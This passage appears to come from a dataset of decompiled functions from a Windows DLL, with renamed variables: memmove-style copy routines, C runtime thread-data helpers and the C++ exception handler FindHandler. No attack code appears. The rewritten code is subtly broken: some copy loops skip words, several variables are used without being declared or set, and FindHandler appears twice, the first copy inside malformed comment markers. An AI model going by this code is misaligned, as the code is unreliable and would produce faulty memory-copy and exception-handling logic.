destinationPointer -= 8; \n                        \n                        *(undefined4 *)destinationPointer = *(undefined4 *)sourcePointer;\n                        *(undefined4 *)(destinationPointer + 1) = *(undefined4 *)(sourcePointer + 1);\n                        *(undefined4 *)(destinationPointer + 2) = *(undefined4 *)(sourcePointer + 2);\n                        *(undefined4 *)(destinationPointer + 3) = *(undefined4 *)(sourcePointer + 3);\n                        remainingBytes -= 0x20; \n                    } while ((remainingBytes & 0xffffffe0) != 0); \n                }\n            }\n        }\n        \n        for (; (remainingBytes & 0xfffffffc) != 0; remainingBytes--) {\n            destinationPointer--; \n            sourcePointer--; \n            *destinationPointer = *sourcePointer; \n        }\n        \n        for (; remainingBytes != 0; remainingBytes--) {\n            destinationPointer--; \n            sourcePointer--; \n            *(undefined *)destinationPointer = *(undefined *)sourcePointer; \n        }\n        return CONCAT44(bytesToCopy, destination); \n    }\n    remainingBytes = bytesToCopy; \n    tempPointer = destination; \n    \n    if (0x1f < bytesToCopy) {\n        \n        if (bytesToCopy < 0x80) {\n            \n            if ((DAT_1004e00c >> 1 & 1) != 0) {\n                \n                if (remainingBytes == 0) goto LAB_10018ba0; \n                \n                for (bytesToCopy = remainingBytes >> 5; bytesToCopy != 0; bytesToCopy--) {\n                    *(uint *)tempPointer = *(uint *)source; \n                    source = (undefined8 *)((int)source + 4); \n                    tempPointer = (undefined8 *)((int)tempPointer + 4); \n                }\n                goto LAB_10018b6b; \n            }\n            LAB_10018897:\n            remainingBytes = (uint)destination & 3; \n            while (remainingBytes != 0) {\n                *(undefined *)tempPointer = *(undefined *)source; \n                bytesToCopy--; \n                source = (undefined8 *)((int)source + 1); \n                tempPointer = (undefined8 *)((int)tempPointer + 1); \n                remainingBytes = (uint)tempPointer & 3; \n            }\n        } else {\n            \n            if ((DAT_1004f954 >> 1 & 1) != 0) {\n                \n                for (; remainingBytes != 0; remainingBytes--) {\n                    *(undefined *)tempPointer = *(undefined *)source; \n                    source = (undefined8 *)((int)source + 1); \n                    tempPointer = (undefined8 *)((int)tempPointer + 1); \n                }\n                return CONCAT44(bytesToCopy, destination); \n            }\n            \n            if (((((uint)destination ^ (uint)source) & 0xf) == 0) && ((DAT_1004e00c >> 1 & 1) != 0)) {\n                \n                if (((uint)source & 0xf) != 0) {\n                    remainingBytes = 0x10 - ((uint)source & 0xf); \n                    bytesToCopy -= remainingBytes; \n                    for (remainingBytes = remainingBytes & 3; remainingBytes != 0; remainingBytes--) {\n                        *(undefined *)tempPointer = *(undefined *)source; \n                        source = (undefined8 *)((int)source + 1); \n                        tempPointer = (undefined8 *)((int)tempPointer + 1); \n                    }\n                    \n                    for (remainingBytes = remainingBytes >> 2; remainingBytes != 0; remainingBytes--) {\n                        *(uint *)tempPointer = *(uint *)source; \n                        source = (undefined8 *)((int)source + 4); \n                        tempPointer = (undefined8 *)((int)tempPointer + 4); \n                    }\n                }\n                remainingBytes = bytesToCopy & 0x7f; \n                \n                for (bytesToCopy = bytesToCopy >> 7; bytesToCopy != 0; bytesToCopy--) {\n                    *(uint *)tempPointer = *(uint *)source; \n                    source = (undefined8 *)((int)source + 4); \n                    tempPointer = (undefined8 *)((int)tempPointer + 4); \n                }\n                goto LAB_10018b3d; \n            }\n            \n            if (((DAT_1004f954 & 1) == 0) || (((uint)destination & 3) != 0)) goto LAB_10018897; \n            \n            if (((uint)source & 3) == 0) {\n                \n                if (((uint)destination >> 2 & 1) != 0) {\n                    *(undefined4 *)destination = *(undefined4 *)source; \n                    bytesToCopy -= 4; \n                    source = (undefined8 *)((int)source + 4); \n                    destination = (undefined8 *)((int)destination + 4); \n                }\n                \n                if (((uint)destination >> 3 & 1) != 0) {\n                    *destination = *source; \n                    bytesToCopy -= 8; \n                    source++; \n                    destination++; \n                }\n                \n                if (((uint)source & 7) == 0) {\n                    tempPointer = source + -1; \n                    do {\n                        sourcePointer = tempPointer; \n                        bytesToCopy -= 0x30; \n                        \n                        *(undefined4 *)(destination + 1) = *(undefined4 *)(sourcePointer + 1);\n                        *(undefined4 *)((int)destination + 0xc) = *(undefined4 *)((int)sourcePointer + 0xc);\n                        *(undefined4 *)(destination + 2) = *(undefined4 *)(sourcePointer + 2);\n                        *(undefined4 *)((int)destination + 0x14) = *(undefined4 *)((int)sourcePointer + 0x14);\n                        destination += 6; \n                        tempPointer = sourcePointer + 6; \n                    } while (0x2f < bytesToCopy); \n                    sourcePointer = sourcePointer + 7; \n                } else if (((uint)source >> 3 & 1) == 0) {\n                    iVar46 = (int)source + -4; \n                    do {\n                        iVar49 = iVar46; \n                        bytesToCopy -= 0x30; \n                        \n                        *(undefined4 *)((int)destination + 4) = *(undefined4 *)sourcePointer;\n                        *(undefined4 *)(destination + 1) = *(undefined4 *)(sourcePointer + 1);\n                        *(undefined4 *)((int)destination + 0xc) = *(undefined4 *)((int)sourcePointer + 0xc);\n                        *(undefined4 *)(destination + 2) = *(undefined4 *)(sourcePointer + 2);\n                        destination += 6; \n                        iVar46 = iVar49 + 0x30; \n                    } while (0x2f < bytesToCopy); \n                    sourcePointer = (undefined8 *)(iVar49 + 0x34); \n                } else {\n                    iVar46 = (int)source + -0xc; \n                    do {\n                        iVar49 = iVar46; \n                        bytesToCopy -= 0x30; \n                        \n                        *(undefined4 *)((int)destination + 0xc) = *(undefined4 *)sourcePointer;\n                        *(undefined4 *)(destination + 2) = *(undefined4 *)(sourcePointer + 2);\n                        *(undefined4 *)((int)destination + 0x14) = *(undefined4 *)((int)sourcePointer + 0x14);\n                        *(undefined4 *)(destination + 3) = *(undefined4 *)(sourcePointer + 3);\n                        destination += 6; \n                        iVar46 = iVar49 + 0x30; \n                    } while (0x2f < bytesToCopy); \n                    sourcePointer = (undefined8 *)(iVar49 + 0x3c); \n                }\n                \n                for (; 0xf < bytesToCopy; bytesToCopy -= 0x10) {\n                    *(undefined4 *)destination = *(undefined4 *)sourcePointer; \n                    *(undefined4 *)((int)destination + 4) = *(undefined4 *)((int)sourcePointer + 4); \n                    *(undefined4 *)(destination + 1) = *(undefined4 *)(sourcePointer + 1); \n                    *(undefined4 *)((int)destination + 0xc) = *(undefined4 *)((int)sourcePointer + 0xc); \n                    destination += 2; \n                    sourcePointer += 2; \n                }\n                \n                if ((bytesToCopy >> 2 & 1) != 0) {\n                    *(undefined4 *)destination = *(undefined4 *)sourcePointer; \n                    bytesToCopy -= 4; \n                    sourcePointer = (undefined8 *)((int)sourcePointer + 4); \n                    destination = (undefined8 *)((int)destination + 4); \n                }\n                \n                if ((bytesToCopy >> 3 & 1) != 0) {\n                    bytesToCopy -= 8; \n                    *destination = *sourcePointer; \n                }\n                return (*(code *)(&switchD_100188c5::switchdataD_100188d4)[bytesToCopy])(); \n            }\n        }\n    }\nLAB_10018b6b:\n    \n    if ((remainingBytes & 0x1f) != 0) {\n        for (uVar48 = (remainingBytes & 0x1f) >> 2; uVar48 != 0; uVar48--) {\n            *(uint *)tempPointer = *(uint *)source; \n            tempPointer = (undefined8 *)((int)tempPointer + 4); \n            source = (undefined8 *)((int)source + 4); \n        }\n        for (remainingBytes = remainingBytes & 3; remainingBytes != 0; remainingBytes--) {\n            *(undefined *)tempPointer = *(undefined *)source; \n            source = (undefined8 *)((int)source + 1); \n            tempPointer = (undefined8 *)((int)tempPointer + 1); \n        }\n    }\nLAB_10018ba0:\n    return CONCAT44(bytesToCopy, destination); \n}"}
{"Function Name": "FUN_10018bf0", "Address": "10018bf0", "Source Code": "ulonglong __cdecl FUN_10018bf0(undefined8 *destination, undefined8 *source, uint dataSize) {\n    undefined4 *sourcePointer; \n    undefined4 *destinationPointer; \n    uint loopCounter; \n    uint alignmentAdjustment; \n    undefined8 *destinationPointerAdjusted; \n    \n    if ((source < destination) && (destination < (undefined8 *)(dataSize + (int)source))) {\n        sourcePointer = (undefined4 *)((int)source + dataSize); \n        destinationPointer = (undefined4 *)((int)destination + dataSize); \n        alignmentAdjustment = dataSize; \n        \n        if (0x1f < dataSize) {\n            \n            if ((DAT_1004e00c >> 1 & 1) == 0) {\n                \n                if (((uint)destinationPointer & 3) != 0) {\n                    alignmentAdjustment = (uint)destinationPointer & 3; \n                    dataSize -= alignmentAdjustment; \n                    do {\n                        \n                        *(undefined *)((int)destinationPointer - 1) = *(undefined *)((int)sourcePointer - 1);\n                        sourcePointer = (undefined4 *)((int)sourcePointer - 1); \n                        destinationPointer = (undefined4 *)((int)destinationPointer - 1); \n                        alignmentAdjustment--; \n                    } while (alignmentAdjustment != 0); \n                }\n                \n                if (0x1f < dataSize) {\n                    \n                    for (loopCounter = dataSize >> 2; loopCounter != 0; loopCounter--) {\n                        destinationPointer[-1] = sourcePointer[-1]; \n                        sourcePointer--; \n                        destinationPointer--; \n                    }\n                    \n                    switch (dataSize & 3) {\n                        case 0: return CONCAT44(dataSize, destination) & 0x3ffffffff; \n                        case 1: *(undefined *)((int)destinationPointer - 1) = *(undefined *)((int)sourcePointer - 1); \n                                return CONCAT44(dataSize, destination) & 0x3ffffffff; \n                        case 2: *(undefined *)((int)destinationPointer - 1) = *(undefined *)((int)sourcePointer - 1); \n                                *(undefined *)((int)destinationPointer - 2) = *(undefined *)((int)sourcePointer - 2); \n                                return CONCAT44(dataSize, destination) & 0x3ffffffff; \n                        case 3: *(undefined *)((int)destinationPointer - 1) = *(undefined *)((int)sourcePointer - 1); \n                                *(undefined *)((int)destinationPointer - 2) = *(undefined *)((int)sourcePointer - 2); \n                                *(undefined *)((int)destinationPointer - 3) = *(undefined *)((int)sourcePointer - 3); \n                                return CONCAT44(dataSize, destination) & 0x3ffffffff; \n                    }\n                }\n            } else {\n                \n                while (((uint)destinationPointer & 0xf) != 0) {\n                    *(undefined *)destinationPointer = *(undefined *)sourcePointer; \n                    sourcePointer = (undefined4 *)((int)sourcePointer - 1); \n                    destinationPointer = (undefined4 *)((int)destinationPointer - 1); \n                    loopCounter--; \n                }\n                \n                do {\n                    if (loopCounter < 0x80) break; \n                    sourcePointer -= 0x20; \n                    destinationPointer -= 0x20; \n                    \n                    *(undefined4 *)(destinationPointer + 0x1f) = *(undefined4 *)(sourcePointer + 0x1f);\n                    *(undefined4 *)(destinationPointer + 0x1e) = *(undefined4 *)(sourcePointer + 0x1e);\n                    *(undefined4 *)(destinationPointer + 0x1d) = *(undefined4 *)(sourcePointer + 0x1d);\n                    *(undefined4 *)(destinationPointer + 0x1c) = *(undefined4 *)(sourcePointer + 0x1c);\n                    *(undefined4 *)(destinationPointer + 0x1b) = *(undefined4 *)(sourcePointer + 0x1b);\n                    *(undefined4 *)(destinationPointer + 0x1a) = *(undefined4 *)(sourcePointer + 0x1a);\n                    *(undefined4 *)(destinationPointer + 0x19) = *(undefined4 *)(sourcePointer + 0x19);\n                    *(undefined4 *)(destinationPointer + 0x18) = *(undefined4 *)(sourcePointer + 0x18);\n                    *(undefined4 *)(destinationPointer + 0x17) = *(undefined4 *)(sourcePointer + 0x17);\n                    *(undefined4 *)(destinationPointer + 0x16) = *(undefined4 *)(sourcePointer + 0x16);\n                    *(undefined4 *)(destinationPointer + 0x15) = *(undefined4 *)(sourcePointer + 0x15);\n                    *(undefined4 *)(destinationPointer + 0x14) = *(undefined4 *)(sourcePointer + 0x14);\n                    *(undefined4 *)(destinationPointer + 0x13) = *(undefined4 *)(sourcePointer + 0x13);\n                    *(undefined4 *)(destinationPointer + 0x12) = *(undefined4 *)(sourcePointer + 0x12);\n                    *(undefined4 *)(destinationPointer + 0x11) = *(undefined4 *)(sourcePointer + 0x11);\n                    *(undefined4 *)(destinationPointer + 0x10) = *(undefined4 *)(sourcePointer + 0x10);\n                    *(undefined4 *)(destinationPointer + 0xf) = *(undefined4 *)(sourcePointer + 0xf);\n                    *(undefined4 *)(destinationPointer + 0xe) = *(undefined4 *)(sourcePointer + 0xe);\n                    *(undefined4 *)(destinationPointer + 0xd) = *(undefined4 *)(sourcePointer + 0xd);\n                    *(undefined4 *)(destinationPointer + 0xc) = *(undefined4 *)(sourcePointer + 0xc);\n                    *(undefined4 *)(destinationPointer + 0xb) = *(undefined4 *)(sourcePointer + 0xb);\n                    *(undefined4 *)(destinationPointer + 0xa) = *(undefined4 *)(sourcePointer + 0xa);\n                    *(undefined4 *)(destinationPointer + 9) = *(undefined4 *)(sourcePointer + 9);\n                    *(undefined4 *)(destinationPointer + 8) = *(undefined4 *)(sourcePointer + 8);\n                    *(undefined4 *)(destinationPointer + 7) = *(undefined4 *)(sourcePointer + 7);\n                    *(undefined4 *)(destinationPointer + 6) = *(undefined4 *)(sourcePointer + 6);\n                    *(undefined4 *)(destinationPointer + 5) = *(undefined4 *)(sourcePointer + 5);\n                    *(undefined4 *)(destinationPointer + 4) = *(undefined4 *)(sourcePointer + 4);\n                    *(undefined4 *)(destinationPointer + 3) = *(undefined4 *)(sourcePointer + 3);\n                    *(undefined4 *)(destinationPointer + 2) = *(undefined4 *)(sourcePointer + 2);\n                    *(undefined4 *)(destinationPointer + 1) = *(undefined4 *)(sourcePointer + 1);\n                    *(undefined4 *)destinationPointer = *sourcePointer; \n                    loopCounter -= 0x80; \n                } while (1);\n                sourcePointer = (undefined4 *)((int)sourcePointer + 0x30); \n            }\n        }\n        \n        for (; (loopCounter & 0xfffffffc) != 0; loopCounter -= 4) {\n            destinationPointer--; \n            sourcePointer--; \n            *destinationPointer = *sourcePointer; \n        }\n        \n        for (; loopCounter != 0; loopCounter--) {\n            destinationPointer = (undefined4 *)((int)destinationPointer - 1); \n            sourcePointer = (undefined4 *)((int)sourcePointer - 1); \n            *(undefined *)destinationPointer = *(undefined *)sourcePointer; \n        }\n        return CONCAT44(alignmentAdjustment, destination); \n    }\n    loopCounter = dataSize; \n    destinationPointerAdjusted = destination; \n    \n    if (0x1f < dataSize) {\n        \n        if (dataSize < 0x80) {\n            \n            if ((DAT_1004e00c >> 1 & 1) != 0) {\n                \n                if (loopCounter == 0) goto LAB_10019120; \n                \n                for (dataSize = loopCounter >> 5; dataSize != 0; dataSize--) {\n                    *(uint *)destinationPointerAdjusted = *(uint *)source; \n                    source = (undefined8 *)((int)source + 4); \n                    destinationPointerAdjusted = destinationPointerAdjusted + 4; \n                }\n                goto LAB_100190eb; \n            }\n            LAB_10018e17:\n            loopCounter = (uint)destination & 3; \n            \n            while (loopCounter != 0) {\n                *(undefined *)destinationPointerAdjusted = *(undefined *)source; \n                dataSize--; \n                source = (undefined8 *)((int)source + 1); \n                destinationPointerAdjusted = (undefined8 *)((int)destinationPointerAdjusted + 1); \n                loopCounter = (uint)destinationPointerAdjusted & 3; \n            }\n        } else {\n            \n            if ((DAT_1004f954 >> 1 & 1) != 0) {\n                \n                for (; loopCounter != 0; loopCounter--) {\n                    *(undefined *)destinationPointerAdjusted = *(undefined *)source; \n                    source = (undefined8 *)((int)source + 1); \n                    destinationPointerAdjusted = (undefined8 *)((int)destinationPointerAdjusted + 1); \n                }\n                return CONCAT44(dataSize, destination); \n            }\n            \n            if (((((uint)destination ^ (uint)source) & 0xf) == 0) && ((DAT_1004e00c >> 1 & 1) != 0)) {\n                \n                if (((uint)source & 0xf) != 0) {\n                    alignmentAdjustment = 0x10 - ((uint)source & 0xf); \n                    dataSize -= alignmentAdjustment; \n                    \n                    for (loopCounter = alignmentAdjustment & 3; loopCounter != 0; loopCounter--) {\n                        *(undefined *)destinationPointerAdjusted = *(undefined *)source; \n                        source = (undefined8 *)((int)source + 1); \n                        destinationPointerAdjusted = (undefined8 *)((int)destinationPointerAdjusted + 1); \n                    }\n                    \n                    for (alignmentAdjustment = alignmentAdjustment >> 2; alignmentAdjustment != 0; alignmentAdjustment--) {\n                        *(uint *)destinationPointerAdjusted = *(uint *)source; \n                        source = (undefined8 *)((int)source + 4); \n                        destinationPointerAdjusted = (undefined8 *)((int)destinationPointerAdjusted + 4); \n                    }\n                }\n                loopCounter = dataSize & 0x7f; \n                \n                for (dataSize = dataSize >> 7; dataSize != 0; dataSize--) {\n                    *(uint *)destinationPointerAdjusted = *(uint *)source; \n                    source = (undefined8 *)((int)source + 4); \n                    destinationPointerAdjusted = (undefined8 *)((int)destinationPointerAdjusted + 4); \n                }\n                goto LAB_100190bd; \n            }\n            \n            if (((DAT_1004f954 & 1) == 0) || (((uint)destination & 3) != 0)) goto LAB_10018e17; \n            \n            if (((uint)source & 3) == 0) {\n                \n                if (((uint)destination >> 2 & 1) != 0) {\n                    *(undefined4 *)destination = *(undefined4 *)source; \n                    dataSize -= 4; \n                    source = (undefined8 *)((int)source + 4); \n                    destination = (undefined8 *)((int)destination + 4); \n                }\n                \n                if (((uint)destination >> 3 & 1) != 0) {\n                    *destination = *source; \n                    dataSize -= 8; \n                    source = source + 1; \n                    destination = destination + 1; \n                }\n                \n                if (((uint)source & 7) == 0) {\n                    \n                    for (; 0xf < dataSize; dataSize -= 0x10) {\n                        *(undefined4 *)destination = *(undefined4 *)source; \n                        *(undefined4 *)((int)destination + 4) = *(undefined4 *)((int)source + 4); \n                        source = (undefined8 *)((int)source + 8); \n                        destination = (undefined8 *)((int)destination + 8); \n                    }\n                    \n                    if ((dataSize >> 2 & 1) != 0) {\n                        *(undefined4 *)destination = *(undefined4 *)source; \n                        dataSize -= 4; \n                        source = (undefined8 *)((int)source + 4); \n                        destination = (undefined8 *)((int)destination + 4); \n                    }\n                    if ((dataSize >> 3 & 1) != 0) {\n                        *destination = *source; \n                    }\n                    return (*(code *)(&switchD_10018e45::switchdataD_10018e54)[dataSize])(); \n                }\n            }\n        }\n    }\n    loopCounter = dataSize; \n    \n    if (0x1f < dataSize) {\n        \n        for (loopCounter = dataSize >> 2; loopCounter != 0; loopCounter--) {\n            *(uint *)destinationPointerAdjusted = *(uint *)source; \n            source = (undefined8 *)((int)source + 4); \n            destinationPointerAdjusted = (undefined8 *)((int)destinationPointerAdjusted + 4); \n        }\n        \n        switch (dataSize & 3) {\n            case 0: return CONCAT44(dataSize, destination) & 0x3ffffffff; \n            case 1: *(undefined *)destinationPointerAdjusted = *(undefined *)source; \n                    return CONCAT44(dataSize, destination) & 0x3ffffffff; \n            case 2: *(undefined *)destinationPointerAdjusted = *(undefined *)source; \n                    *(undefined *)((int)destinationPointerAdjusted + 1) = *(undefined *)((int)source + 1); \n                    return CONCAT44(dataSize, destination) & 0x3ffffffff; \n            case 3: *(undefined *)destinationPointerAdjusted = *(undefined *)source; \n                    *(undefined *)((int)destinationPointerAdjusted + 1) = *(undefined *)((int)source + 1); \n                    *(undefined *)((int)destinationPointerAdjusted + 2) = *(undefined *)((int)source + 2); \n                    return CONCAT44(dataSize, destination) & 0x3ffffffff; \n        }\n    }\n    LAB_100190eb:\n    \n    if ((loopCounter & 0x1f) != 0) {\n        \n        for (alignmentAdjustment = (loopCounter & 0x1f) >> 2; alignmentAdjustment != 0; alignmentAdjustment--) {\n            *(uint *)destinationPointerAdjusted = *(uint *)source; \n            destinationPointerAdjusted = (undefined8 *)((int)destinationPointerAdjusted + 4); \n            source = (undefined8 *)((int)source + 4); \n        }\n        \n        for (loopCounter = loopCounter & 3; loopCounter != 0; loopCounter--) {\n            *(undefined *)destinationPointerAdjusted = *(undefined *)source; \n            source = (undefined8 *)((int)source + 1); \n            destinationPointerAdjusted = (undefined8 *)((int)destinationPointerAdjusted + 1); \n        }\n    }\n    LAB_10019120:\n    return CONCAT44(dataSize, destination); \n}"}
{"Function Name": "___vcrt_getptd", "Address": "1001a223", "Source Code": "void ___vcrt_getptd(void)\n{\n    \n    LPVOID resultPointer = ___vcrt_getptd_noexit();\n    \n    \n    if (resultPointer != (LPVOID)0x0) {\n        \n        return;\n    }\n    \n    \n    if (getSigabrtHandler() != 0) {\n        \n        raiseSignal(0x16);\n    }\n    \n    \n    if ((flagVariable & 2) != 0 && isProcessorFeatureAvailable(0x17)) {\n        \n        ((code *)softwareInterrupt(0x29))();\n    }\n    \n    \n    reportFault(3, 0x40000015, 1);\n    \n    \n    exitProgram(3);\n}"}
{"Function Name": "___vcrt_uninitialize_ptd", "Address": "1001a32d", "Source Code": "undefined4 ___vcrt_uninitialize_ptd(void)\n{\n    \n    if (thread_local_storage != 0xffffffff) {\n        \n        free_thread_local_storage(thread_local_storage);\n        \n        thread_local_storage = 0xffffffff;\n    }\n    \n    return 1;\n}"}
{"Function Name": "FindHandler<class___FrameHandler3>", "Address": "1001a5a0", "Source Code": "\\*\nvoid __cdecl\nFindHandler<class___FrameHandler3>\n(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3, void *param_4,\n_s_FuncInfo *param_5, uchar param_6, int param_7, EHRegistrationNode *param_8)\n{\n    int iVar3, iVar7, iVar9; \n    uchar uVar5, local_5 = '\\0'; \n    bool bVar6; \n    _s_FuncInfo *local_20 = param_5; \n    _CONTEXT *local_10 = param_3; \n    int local_c = __FrameHandler3::GetCurrentState(param_2, param_4, param_5); \n    \n    if ((local_c < -1) || (param_5->maxState <= local_c)) goto LAB_1001a928;\n    \n    if ((*(int *)param_1 == -0x1f928c9d) && (*(int *)(param_1 + 0x10) == 3) &&\n        ((*(int *)(param_1 + 0x14) == 0x19930520 || (*(int *)(param_1 + 0x14) == 0x19930521) ||\n        (*(int *)(param_1 + 0x14) == 0x19930522)) && (*(int *)(param_1 + 0x1c) == 0)))) {\n        \n        iVar7 = ___vcrt_getptd(); \n        if (*(int *)(iVar7 + 0x10) == 0) return; \n        \n        param_1 = *(EHExceptionRecord **)(iVar7 + 0x10); \n        local_10 = *(_CONTEXT **)(iVar7 + 0x14); \n        \n        if ((int *)param_1 == (int *)0x0 || \n            ((*(int *)param_1 == -0x1f928c9d && (*(int *)((int)param_1 + 0x10) == 3) &&\n            ((*(int *)((int)param_1 + 0x14) == 0x19930520 || \n            (*(int *)((int)param_1 + 0x14) == 0x19930521 || \n            (*(int *)((int)param_1 + 0x14) == 0x19930522)))))) && \n            (*(int *)((int)param_1 + 0x1c) == 0)))) goto LAB_1001a928;\n        \n        if (*(int *)(iVar7 + 0x1c) != 0) {\n            local_20 = *(_s_FuncInfo **)(iVar7 + 0x1c); \n            *(undefined4 *)(iVar7 + 0x1c) = 0; \n            uVar5 = IsInExceptionSpec(param_1, (_s_ESTypeList *)local_20); \n            if (uVar5 == '\\0' && 0 < (int)local_20->magicNumber_and_bbtFlags) {\n                do {\n                    \n                    bVar6 = type_info::operator==(*(type_info **)((int)&local_20->maxState + local_20->maxState),\n                                                   (type_info *)&std::bad_exception::RTTI_Type_Descriptor);\n                    if (bVar6) {\n                        ___DestructExceptionObject((int *)param_1); \n                        std::bad_exception::bad_exception((bad_exception *)local_54); \n                        __CxxThrowException_8((int *)local_54, &DAT_1004c05c); \n                        goto LAB_1001a8e9; \n                    }\n                    local_20 = (_s_FuncInfo *)&local_20->pTryBlockMap; \n                } while (++iVar9 < (int)local_20->magicNumber_and_bbtFlags); \n            }\n            goto LAB_1001a928; \n        }\n    }\n    \n    if ((*(int *)param_1 == -0x1f928c9d) && (*(int *)((int)param_1 + 0x10) == 3) &&\n        ((*(int *)((int)param_1 + 0x14) == 0x19930520 || \n        (*(int *)((int)param_1 + 0x14) == 0x19930521 || \n        (*(int *)((int)param_1 + 0x14) == 0x19930522))))) {\n        \n        \n        if (param_5->nTryBlocks != 0) {\n            __FrameHandler3::GetRangeOfTrysToCheck(&local_58, &local_20, local_c, param_7); \n            if (local_54[0] < local_4c) {\n                _s_FuncInfo *local_40 = (_s_FuncInfo *)(local_54[0] * 0x14); \n                do {\n                    _s_TryBlockMapEntry *local_14 = (_s_TryBlockMapEntry *)((int)local_40 + *(int *)(*local_30 + 0x10)); \n                    \n                    if ((local_14->tryLow <= local_c) && (local_c <= local_14->tryHigh)) {\n                        _s_HandlerType *local_14 = local_14->pHandlerArray; \n                        int local_38 = local_14->nCatches; \n                        if (local_38 != 0) {\n                            iVar7 = **(int **)(*(int *)((int)param_1 + 0x1c) + 0xc); \n                            _s_CatchableType **pp_Var4 = (_s_CatchableType **)(*(int **)(*(int *)((int)param_1 + 0x1c) + 0xc) + 1); \n                            do {\n                                while (local_24 = iVar7, 0 < local_24) {\n                                    \n                                    if (TypeMatchHelper<struct__s_HandlerType_const_>(local_14, *pp_Var4, *(_s_ThrowInfo **)((int)param_1 + 0x1c))) {\n                                        local_5 = '\\x01'; \n                                        \n                                        CatchIt<class___FrameHandler3>(param_1, param_2, local_10, param_4, param_5, local_14, *pp_Var4, local_14, param_7, param_8, (uchar)local_2c);\n                                        goto LAB_1001a830; \n                                    }\n                                    iVar7 = local_34; \n                                    pp_Var4++; \n                                    local_24--; \n                                }\n                                local_14++; \n                            } while (++local_28 != local_38); \n                        }\n                    }\n                    local_40 = (_s_FuncInfo *)((int)local_40 + 0x14); \n                } while (++local_1c < local_4c); \n            }\n        }\n        \n        if (param_6 != '\\0') {\n            ___DestructExceptionObject((int *)param_1); \n        }\n        \n        if ((local_5 == '\\0') && (0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff)) &&\n            (param_5->pESTypeList != (ESTypeList *)0x0 || \n            (((uint)param_5->EHFlags >> 2 & 1) != 0 && (param_7 == 0))))) {\n            \n            \n            if (((uint)param_5->EHFlags >> 2 & 1) != 0) goto LAB_1001a928; \n            uVar5 = IsInExceptionSpec(param_1, param_5->pESTypeList); \n            if (uVar5 == '\\0') {\nLAB_1001a8e9:\n                iVar9 = ___vcrt_getptd(); \n                *(EHExceptionRecord **)(iVar9 + 0x10) = param_1; \n                *(_CONTEXT **)(iVar9 + 0x14) = local_10; \n                if (param_8 == (EHRegistrationNode *)0x0) {\n                    param_8 = param_2; \n                }\n                _UnwindNestedFrames(param_8, param_1); \n                __FrameHandler3::FrameUnwindToEmptyState(param_2, param_4, param_5); \n                _s_ESTypeList *p_Var8 = __FrameHandler3::getESTypes(param_5); \n                FUN_1001ade5(p_Var8); \n                goto LAB_1001a928; \n            }\n        }\n    } else if (param_5->nTryBlocks != 0) {\n        \n        if (param_6 != '\\0') goto LAB_1001a928; \n        \n        FindHandlerForForeignException<class___FrameHandler3>(param_1, param_2, local_10, param_4, param_5, local_c, param_7, param_8);\n    }\n    iVar9 = ___vcrt_getptd(); \n    if (*(int *)(iVar9 + 0x1c) == 0) return; \nLAB_1001a928:\n    _terminate(); \n    ((code *)swi(3))(); \n    return; \n}\n*\\ \n \nvoid __cdecl\nFindHandler<class___FrameHandler3>\n(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3, void *param_4,\n_s_FuncInfo *param_5, uchar param_6, int param_7, EHRegistrationNode *param_8)\n{\n    int iVar3, iVar7, iVar9;\n    uchar uVar5, local_5 = '\\0';\n    bool bVar6;\n    _s_FuncInfo *local_20 = param_5;\n    _CONTEXT *local_10 = param_3;\n    int local_c = __FrameHandler3::GetCurrentState(param_2, param_4, param_5);\n    \n    if ((local_c < -1) || (param_5->maxState <= local_c)) goto LAB_1001a928;\n    if ((*(int *)param_1 == -0x1f928c9d) && (*(int *)(param_1 + 0x10) == 3) &&\n        ((*(int *)(param_1 + 0x14) == 0x19930520 || (*(int *)(param_1 + 0x14) == 0x19930521) ||\n        (*(int *)(param_1 + 0x14) == 0x19930522)) && (*(int *)(param_1 + 0x1c) == 0)))) {\n        \n        iVar7 = ___vcrt_getptd();\n        if (*(int *)(iVar7 + 0x10) == 0) return;\n        \n        param_1 = *(EHExceptionRecord **)(iVar7 + 0x10);\n        local_10 = *(_CONTEXT **)(iVar7 + 0x14);\n        \n        if ((int *)param_1 == (int *)0x0 || \n            ((*(int *)param_1 == -0x1f928c9d && (*(int *)((int)param_1 + 0x10) == 3) &&\n            ((*(int *)((int)param_1 + 0x14) == 0x19930520 || \n            (*(int *)((int)param_1 + 0x14) == 0x19930521 || \n            (*(int *)((int)param_1 + 0x14) == 0x19930522)))))) && \n            (*(int *)((int)param_1 + 0x1c) == 0)))) goto LAB_1001a928;\n        if (*(int *)(iVar7 + 0x1c) != 0) {\n            local_20 = *(_s_FuncInfo **)(iVar7 + 0x1c);\n            *(undefined4 *)(iVar7 + 0x1c) = 0;\n            uVar5 = IsInExceptionSpec(param_1, (_s_ESTypeList *)local_20);\n            if (uVar5 == '\\0' && 0 < (int)local_20->magicNumber_and_bbtFlags) {\n                do {\n                    bVar6 = type_info::operator==(*(type_info **)((int)&local_20->maxState + local_20->maxState),\n                                                   (type_info *)&std::bad_exception::RTTI_Type_Descriptor);\n                    if (bVar6) {\n                        ___DestructExceptionObject((int *)param_1);\n                        std::bad_exception::bad_exception((bad_exception *)local_54);\n                        __CxxThrowException_8((int *)local_54, &DAT_1004c05c);\n                        goto LAB_1001a8e9;\n                    }\n                    local_20 = (_s_FuncInfo *)&local_20->pTryBlockMap;\n                } while (++iVar9 < (int)local_20->magicNumber_and_bbtFlags);\n            }\n            goto LAB_1001a928;\n        }\n    }\n    if ((*(int *)param_1 == -0x1f928c9d) && (*(int *)((int)param_1 + 0x10) == 3) &&\n        ((*(int *)((int)param_1 + 0x14) == 0x19930520 || \n        (*(int *)((int)param_1 + 0x14) == 0x19930521 || \n        (*(int *)((int)param_1 + 0x14) == 0x19930522))))) {\n        \n        if (param_5->nTryBlocks != 0) {\n            __FrameHandler3::GetRangeOfTrysToCheck(&local_58, &local_20, local_c, param_7);\n            if (local_54[0] < local_4c) {\n                _s_FuncInfo *local_40 = (_s_FuncInfo *)(local_54[0] * 0x14);\n                do {\n                    _s_TryBlockMapEntry *local_14 = (_s_TryBlockMapEntry *)((int)local_40 + *(int *)(*local_30 + 0x10));\n                    if ((local_14->tryLow <= local_c) && (local_c <= local_14->tryHigh)) {\n                        _s_HandlerType *local_14 = local_14->pHandlerArray;\n                        int local_38 = local_14->nCatches;\n                        if (local_38 != 0) {\n                            iVar7 = **(int **)(*(int *)((int)param_1 + 0x1c) + 0xc);\n                            _s_CatchableType **pp_Var4 = (_s_CatchableType **)(*(int 